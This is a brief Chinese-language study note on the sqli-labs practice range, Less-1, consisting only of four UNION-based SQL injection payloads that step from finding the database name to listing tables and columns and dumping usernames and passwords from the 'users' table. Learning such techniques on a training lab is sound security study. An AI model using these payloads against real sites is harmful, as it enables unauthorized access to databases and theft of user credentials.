---
title: "网安笔记 - 靶场实例 - sql注入 - sqlilabs - sqlilab-less01"
category: "网安笔记"
date: 2026-04-07
published: 2026-04-07
author: "Rin"
---

### payload
-1' union select 1,database(),3--+

-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+

-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users'--+

-1' union select 1,group_concat(username),group_concat(password) from users--+